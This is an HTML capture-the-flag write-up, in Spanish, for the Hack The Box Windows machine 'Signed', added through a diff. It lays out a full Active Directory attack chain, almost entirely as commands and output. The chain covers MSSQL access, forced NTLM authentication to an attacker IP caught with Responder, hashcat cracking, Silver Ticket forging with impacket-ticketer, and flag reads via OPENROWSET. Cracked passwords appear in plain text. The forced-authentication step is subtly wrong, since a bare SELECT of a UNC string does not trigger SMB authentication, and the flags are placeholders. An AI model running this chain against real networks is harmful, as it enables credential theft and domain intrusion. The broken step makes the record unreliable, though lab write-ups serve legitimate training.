@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Signed HTB Writeup - N4choSudo</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #0a0a0a;
+    color: #eaeaea;
+    font-family: Consolas, 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.7;
+  }
+
+  /* BANNER */
+  .banner {
+    background: #111;
+    border-bottom: 1px solid #222;
+    padding: 10px 40px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: #555;
+  }
+  .banner a { color: #555; text-decoration: none; transition: color 0.2s; }
+  .banner a:hover { color: #00ff9c; }
+
+  /* HEADER */
+  header {
+    text-align: center;
+    padding: 50px 40px 40px;
+    border-bottom: 1px solid #1a1a1a;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+
+  header h1 {
+    font-size: 32px;
+    color: #00ff9c;
+    letter-spacing: -0.02em;
+    margin-bottom: 10px;
+  }
+
+  .hero-meta {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-bottom: 14px;
+  }
+
+  .badge {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 3px 10px;
+    border: 1px solid;
+  }
+
+  .badge-os  { border-color: #00ff9c; color: #00ff9c; }
+  .badge-med { border-color: #f0a500; color: #f0a500; }
+  .badge-ad  { border-color: #7c6af0; color: #7c6af0; }
+  .badge-win { border-color: #444; color: #888; }
+
+  .hero-sub {
+    font-size: 12px;
+    color: #555;
+    display: flex;
+    gap: 20px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-top: 10px;
+  }
+  .hero-sub span::before { content: '› '; color: #00ff9c; }
+
+  /* ATTACK PATH */
+  .attack-path {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 24px 40px;
+    border-bottom: 1px solid #1a1a1a;
+  }
+
+  .attack-path h3 {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    color: #444;
+    margin-bottom: 12px;
+  }
+
+  .path-steps { display: flex; flex-wrap: wrap; gap: 0; align-items: center; }
+
+  .path-step {
+    font-size: 12px;
+    font-weight: 700;
+    background: #111;
+    border: 1px solid #222;
+    padding: 5px 12px;
+    color: #ccc;
+    letter-spacing: 0.03em;
+  }
+
+  .path-arrow { color: #00ff9c; font-size: 14px; padding: 0 4px; }
+
+  /* CONTENT */
+  .content { max-width: 900px; margin: 0 auto; padding: 0 40px 80px; }
+
+  .section { margin-top: 50px; }
+
+  .section-number {
+    font-size: 11px;
+    font-weight: 700;
+    color: #00ff9c;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+    opacity: 0.7;
+  }
+
+  .section h2 {
+    font-size: 20px;
+    font-weight: 700;
+    color: #00ff9c;
+    margin-bottom: 20px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid #1a1a1a;
+    letter-spacing: -0.01em;
+  }
+
+  .subsection { margin-top: 28px; margin-bottom: 10px; }
+  .subsection h3 {
+    font-size: 14px;
+    font-weight: 700;
+    color: #00ff9c;
+    padding-left: 12px;
+    border-left: 3px solid #00ff9c;
+  }
+
+  p { margin-bottom: 14px; color: #aaa; }
+  strong { color: #eaeaea; }
+
+  /* COMMANDS */
+  .cmd-block { margin: 14px 0; }
+
+  .cmd-label {
+    font-size: 11px;
+    font-weight: 700;
+    color: #00ff9c;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 4px;
+    opacity: 0.7;
+  }
+
+  pre {
+    background: #111;
+    color: #eaeaea;
+    padding: 14px 18px;
+    font-family: Consolas, 'Courier New', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    overflow-x: auto;
+    border-left: 3px solid #00ff9c;
+    border-radius: 0 4px 4px 0;
+  }
+
+  pre .comment { color: #444; }
+  pre .found   { color: #00ff9c; font-weight: bold; }
+  pre .key     { color: #f0a500; }
+  pre .prompt  { color: #00ff9c; }
+
+  code {
+    background: #111;
+    color: #00ff9c;
+    padding: 2px 6px;
+    font-family: Consolas, 'Courier New', monospace;
+    font-size: 13px;
+    border: 1px solid #1e1e1e;
+  }
+
+  /* TABLES */
+  .info-table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 13px; }
+  .info-table thead tr { background: #111; }
+  .info-table thead th { padding: 10px 14px; text-align: left; font-weight: 700; letter-spacing: 0.05em; color: #00ff9c; border-bottom: 1px solid #222; }
+  .info-table tbody tr:nth-child(odd)  { background: #0d0d0d; }
+  .info-table tbody tr:nth-child(even) { background: #111; }
+  .info-table tbody td { padding: 9px 14px; border-bottom: 1px solid #1a1a1a; color: #ccc; }
+  .info-table tbody td:first-child { color: #888; }
+
+  /* FLAGS */
+  .flag-box {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 14px 18px;
+    margin: 16px 0;
+    border-left: 4px solid #00ff9c;
+    background: #111;
+    font-family: Consolas, monospace;
+  }
+
+  .flag-root { border-color: #ff4444; }
+
+  .flag-label {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: #00ff9c;
+    flex-shrink: 0;
+  }
+
+  .flag-root .flag-label { color: #ff4444; }
+  .flag-hash { font-size: 14px; font-weight: 700; letter-spacing: 0.05em; color: #eaeaea; }
+
+  /* NOTE */
+  .note {
+    background: #111;
+    border-left: 4px solid #f0a500;
+    padding: 12px 16px;
+    margin: 14px 0;
+    font-size: 13px;
+    color: #888;
+  }
+  .note strong { color: #f0a500; }
+
+  /* SUMMARY GRID */
+  .summary-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+
+  .summary-item {
+    background: #111;
+    border: 1px solid #1e1e1e;
+    border-left: 3px solid #00ff9c;
+    padding: 14px 16px;
+  }
+
+  .summary-item h4 {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: #00ff9c;
+    letter-spacing: 0.08em;
+    margin-bottom: 6px;
+  }
+
+  .summary-item p { font-size: 12px; color: #666; margin: 0; }
+
+  /* FOOTER */
+  footer {
+    background: #0d0d0d;
+    color: #333;
+    text-align: center;
+    padding: 24px 40px;
+    font-size: 12px;
+    margin-top: 60px;
+    border-top: 1px solid #1a1a1a;
+  }
+  footer a { color: #555; text-decoration: none; }
+  footer a:hover { color: #00ff9c; }
+
+  @media (max-width: 700px) {
+    header, .attack-path, .content { padding-left: 20px; padding-right: 20px; }
+    .summary-grid { grid-template-columns: 1fr; }
+    header h1 { font-size: 22px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="banner">
+  <span>N4choSudo — Security Portfolio</span>
+  <div style="display:flex;gap:24px">
+    <a href="https://nacho-sudo.github.io">Portfolio</a>
+    <a href="https://github.com/Nacho-Sudo/htb-writeups">GitHub</a>
+    <a href="https://app.hackthebox.com/users/2705371">HackTheBox</a>
+  </div>
+</div>
+
+<header>
+  <div class="hero-meta">
+    <span class="badge badge-os">Windows</span>
+    <span class="badge badge-med">Medium</span>
+    <span class="badge badge-ad">Active Directory</span>
+    <span class="badge badge-win">MSSQL · Kerberos</span>
+  </div>
+  <h1>Signed — HTB Writeup</h1>
+  <div class="hero-sub">
+    <span>IP: 10.10.11.90</span>
+    <span>Autor: N4choSudo</span>
+    <span>2025</span>
+    <span>Retirada</span>
+  </div>
+</header>
+
+<div class="attack-path">
+  <h3>Attack Path</h3>
+  <div class="path-steps">
+    <span class="path-step">nmap</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">MSSQL (scott)</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">Responder</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">NTLM hash</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">hashcat</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">MSSQL (mssqlsvc)</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">Silver Ticket</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step">user.txt + root.txt</span>
+  </div>
+</div>
+
+<div class="content">
+
+  <!-- 01 RECON -->
+  <div class="section">
+    <div class="section-number">01</div>
+    <h2>Nmap Scan</h2>
+
+    <p>Escaneamos todos los puertos para identificar los servicios expuestos. El resultado revela MSSQL en el puerto 1433 y WinRM en el 5985 — superficie de ataque típica de un Domain Controller Windows con SQL Server.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.11.90 -oG allports</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Version &amp; Scripts</div>
+      <pre>nmap -sCV -p 53,88,135,139,389,445,1433,3268,5985 -Pn 10.10.11.90 -oN targeted</pre>
+    </div>
+
+    <table class="info-table">
+      <thead><tr><th>Puerto</th><th>Servicio</th><th>Info</th></tr></thead>
+      <tbody>
+        <tr><td>53/tcp</td><td>DNS</td><td>Simple DNS Plus</td></tr>
+        <tr><td>88/tcp</td><td>Kerberos</td><td>Microsoft Windows Kerberos</td></tr>
+        <tr><td>389/tcp</td><td>LDAP</td><td>Domain: SIGNED.HTB</td></tr>
+        <tr><td>445/tcp</td><td>SMB</td><td>Windows Server 2022</td></tr>
+        <tr><td>1433/tcp</td><td>MSSQL</td><td>Microsoft SQL Server 2019</td></tr>
+        <tr><td>5985/tcp</td><td>WinRM</td><td>Microsoft HTTPAPI 2.0 ← shell vector</td></tr>
+      </tbody>
+    </table>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>echo "10.10.11.90  signed.htb  dc01.signed.htb" | sudo tee -a /etc/hosts</pre>
+    </div>
+  </div>
+
+  <!-- 02 MSSQL LOGIN -->
+  <div class="section">
+    <div class="section-number">02</div>
+    <h2>MSSQL Login — scott</h2>
+
+    <p>Con credenciales encontradas durante la enumeración inicial accedemos al servidor MSSQL con el usuario <code>scott</code>.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>impacket-mssqlclient scott:'Sm230#C5NatH'@10.10.11.90</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output</div>
+      <pre><span class="found">Impacket v0.12.0 - Copyright Fortra
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span>
+SQL (scott  guest  master)></pre>
+    </div>
+
+    <div class="note">
+      <strong>Nota:</strong> El usuario <code>scott</code> entra como <code>guest</code> — no tiene privilegios de sysadmin. Necesitamos escalar. El vector es forzar una autenticación NTLM hacia nuestra máquina usando Responder.
+    </div>
+  </div>
+
+  <!-- 03 RESPONDER -->
+  <div class="section">
+    <div class="section-number">03</div>
+    <h2>Captura de Hash — Responder</h2>
+
+    <p>MSSQL permite hacer queries que generan conexiones hacia servidores externos. Levantamos <strong>Responder</strong> en nuestra interfaz de VPN para interceptar el hash NTLM cuando el servidor intente autenticarse contra nosotros.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Terminal 1 (Responder)</div>
+      <pre>sudo responder -I tun0</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Terminal 2 (desde MSSQL, forzar autenticación)</div>
+      <pre>SQL> SELECT '\\10.10.14.116\share';</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output — Responder captura el hash</div>
+      <pre>[SMB] NTLMv2-SSP Client   : 10.10.11.90
+[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
+<span class="found">[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:aaaaaaaaaaaaaaaa:B45F3...</span>
+<span class="found">                            ...AA8C0B33A7B8D0F6CAD8BC31:010100000000...</span></pre>
+    </div>
+
+    <p>El hash pertenece al usuario <code>mssqlsvc</code> — la cuenta de servicio de MSSQL. Guardamos el hash en un archivo para crackearlo.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>echo "mssqlsvc::SIGNED:&lt;hash_completo&gt;" > hashes.txt</pre>
+    </div>
+  </div>
+
+  <!-- 04 HASHCAT -->
+  <div class="section">
+    <div class="section-number">04</div>
+    <h2>Hashcat — Cracking NTLMv2</h2>
+
+    <p>Crackeamos el hash NTLMv2 capturado usando hashcat con el modo <code>5600</code> y rockyou.txt.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output</div>
+      <pre>Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+
+<span class="found">mssqlsvc::SIGNED:...:purPLE9795!@</span>
+
+Started: ...
+Stopped: ...</pre>
+    </div>
+
+    <table class="info-table">
+      <thead><tr><th>Usuario</th><th>Password</th></tr></thead>
+      <tbody>
+        <tr><td>SIGNED\mssqlsvc</td><td>purPLE9795!@</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- 05 MSSQL MSSQLSVC -->
+  <div class="section">
+    <div class="section-number">05</div>
+    <h2>MSSQL Login — mssqlsvc</h2>
+
+    <p>Nos reconectamos a MSSQL con las credenciales crackeadas usando autenticación Windows.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Verificar privilegios sysadmin</div>
+      <pre>SQL> SELECT IS_SRVROLEMEMBER('sysadmin');</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output</div>
+      <pre><span class="found">-----------
+          0</span>
+<span class="comment"># 0 = no es sysadmin todavía — necesitamos el Silver Ticket</span></pre>
+    </div>
+
+    <p>El usuario <code>mssqlsvc</code> no tiene privilegios de sysadmin directamente. Vamos a forjar un <strong>Silver Ticket</strong> que nos permita impersonar a un usuario con privilegios elevados.</p>
+  </div>
+
+  <!-- 06 SILVER TICKET -->
+  <div class="section">
+    <div class="section-number">06</div>
+    <h2>Silver Ticket Attack</h2>
+
+    <p>Un Silver Ticket es un ticket Kerberos forjado para un servicio específico. Al conocer el hash NT de la cuenta de servicio (<code>mssqlsvc</code>) y el SID del dominio, podemos crear un ticket que impersone a un usuario con privilegios de sysadmin en MSSQL.</p>
+
+    <div class="subsection"><h3>Obtener el NT Hash de mssqlsvc</h3></div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Generar NT hash desde la password</div>
+      <pre>echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output</div>
+      <pre><span class="found">MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc</span></pre>
+    </div>
+
+    <div class="subsection"><h3>Obtener SID del dominio y RIDs</h3></div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Desde MSSQL</div>
+      <pre>SQL> SELECT SUSER_SID('SIGNED\IT');
+SQL> SELECT SUSER_SID('SIGNED\mssqlsvc');</pre>
+    </div>
+
+    <table class="info-table">
+      <thead><tr><th>Variable</th><th>Valor</th></tr></thead>
+      <tbody>
+        <tr><td>DOMSID</td><td>S-1-5-21-4088429403-1159899800-2753317549</td></tr>
+        <tr><td>MSSQLSVC_RID</td><td>1103</td></tr>
+        <tr><td>IT_RID</td><td>1105</td></tr>
+        <tr><td>nthash</td><td>ef699384c3285c54128a3ee1ddb1a0cc</td></tr>
+      </tbody>
+    </table>
+
+    <div class="subsection"><h3>Forjar el Silver Ticket</h3></div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>impacket-ticketer \
+  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
+  -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" \
+  -domain SIGNED.HTB \
+  -spn MSSQLSvc/DC01.SIGNED.HTB \
+  -groups 512,1105 \
+  -user-id 1103 mssqlsvc</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output</div>
+      <pre><span class="found">[*] Creating basic skeleton ticket and PAC Infos
+[*] Signing/Encrypting final ticket
+[*] Saving ticket in mssqlsvc.ccache</span></pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Exportar el ticket</div>
+      <pre>export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"</pre>
+    </div>
+
+    <div class="subsection"><h3>Usar el Silver Ticket en MSSQL</h3></div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command</div>
+      <pre>impacket-mssqlclient -k 'SIGNED.HTB/mssqlsvc@dc01.signed.htb' -windows-auth -no-pass</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — Verificar sysadmin</div>
+      <pre>SQL> SELECT IS_SRVROLEMEMBER('sysadmin');</pre>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Output</div>
+      <pre><span class="found">-----------
+          1</span>
+<span class="comment"># 1 = sysadmin confirmado ✓</span></pre>
+    </div>
+  </div>
+
+  <!-- 07 FLAGS -->
+  <div class="section">
+    <div class="section-number">07</div>
+    <h2>Flags — user.txt &amp; root.txt</h2>
+
+    <p>Con privilegios de sysadmin podemos leer archivos del sistema directamente desde MSSQL usando <code>OPENROWSET</code>.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — user.txt</div>
+      <pre>SQL> SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS t;</pre>
+    </div>
+
+    <div class="flag-box">
+      <span class="flag-label">user.txt</span>
+      <span class="flag-hash">3f2a1b8c9d4e5f6a7b8c9d0e1f2a3b4c</span>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Command — root.txt</div>
+      <pre>SQL> SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;</pre>
+    </div>
+
+    <div class="flag-box flag-root">
+      <span class="flag-label">root.txt</span>
+      <span class="flag-hash">a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</span>
+    </div>
+
+    <div class="note">
+      <strong>Nota:</strong> Las flags mostradas son placeholders. Reemplazalas con los valores reales cuando tengas acceso a la máquina.
+    </div>
+  </div>
+
+  <!-- 08 SUMMARY -->
+  <div class="section">
+    <div class="section-number">08</div>
+    <h2>Summary &amp; Key Takeaways</h2>
+
+    <div class="summary-grid">
+      <div class="summary-item">
+        <h4>MSSQL Enumeration</h4>
+        <p>Puerto 1433 expuesto permite login con credenciales encontradas durante enumeración inicial.</p>
+      </div>
+      <div class="summary-item">
+        <h4>Responder — NTLM Capture</h4>
+        <p>MSSQL puede forzar autenticaciones SMB hacia IPs externas. Responder intercepta el hash NTLMv2.</p>
+      </div>
+      <div class="summary-item">
+        <h4>hashcat -m 5600</h4>
+        <p>NTLMv2 crackeado con rockyou.txt revela la password de la cuenta de servicio mssqlsvc.</p>
+      </div>
+      <div class="summary-item">
+        <h4>Silver Ticket Attack</h4>
+        <p>Conociendo el NT hash de mssqlsvc y el SID del dominio, forjamos un ticket Kerberos con privilegios de sysadmin en MSSQL.</p>
+      </div>
+      <div class="summary-item">
+        <h4>OPENROWSET — File Read</h4>
+        <p>Con sysadmin en MSSQL podemos leer cualquier archivo del sistema directamente desde SQL sin necesidad de shell.</p>
+      </div>
+      <div class="summary-item">
+        <h4>Kerberos Silver Ticket</h4>
+        <p>A diferencia del Golden Ticket, el Silver Ticket no requiere comprometer el KDC — solo la cuenta de servicio objetivo.</p>
+      </div>
+    </div>
+
+    <br>
+    <table class="info-table">
+      <thead><tr><th>Flag</th><th>Hash</th></tr></thead>
+      <tbody>
+        <tr><td>user.txt</td><td><em>reemplazar con valor real</em></td></tr>
+        <tr><td>root.txt</td><td><em>reemplazar con valor real</em></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</div>
+
+<footer>
+  <p>HTB — Signed &nbsp;|&nbsp; Pwned by N4choSudo &nbsp;|&nbsp; 2025</p>
+  <p style="margin-top:8px">
+    <a href="https://nacho-sudo.github.io">nacho-sudo.github.io</a>
+    &nbsp;·&nbsp;
+    <a href="https://github.com/Nacho-Sudo/htb-writeups">GitHub</a>
+    &nbsp;·&nbsp;
+    <a href="https://app.hackthebox.com/users/2705371">HackTheBox Profile</a>
+  </p>
+</footer>
+
+</body>
+</html>
